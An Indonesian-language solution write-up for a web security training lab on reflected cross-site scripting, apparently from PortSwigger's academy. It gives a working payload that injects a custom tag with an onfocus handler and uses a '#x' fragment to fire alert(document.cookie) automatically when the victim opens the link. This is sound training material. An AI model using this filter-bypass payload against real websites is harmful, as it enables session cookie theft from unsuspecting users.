# Reflected XSS into HTML context with all tags blocked except custom ones

Lab ini memblokir semua tag HTML kecuali **custom tag**.

Untuk menyelesaikan lab ini, lakukan serangan **cross-site scripting (XSS)** yang menyisipkan sebuah **custom tag** dan secara otomatis memunculkan **alert yang berisi `document.cookie`**.


## Solusi

1. Pergi ke **exploit server** dan tempel kode berikut, lalu ganti **YOUR-LAB-ID** dengan ID lab kamu:

```html 
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

2. Klik **"Store"** lalu pilih **"Deliver exploit to victim"**.

---

Injection ini membuat **custom tag** dengan ID `x`, yang berisi event handler **`onfocus`** untuk menjalankan `alert(document.cookie)`.
Bagian hash `#x` di akhir URL akan langsung memfokuskan elemen tersebut saat halaman dibuka, sehingga payload otomatis ter-trigger dan alert dijalankan.
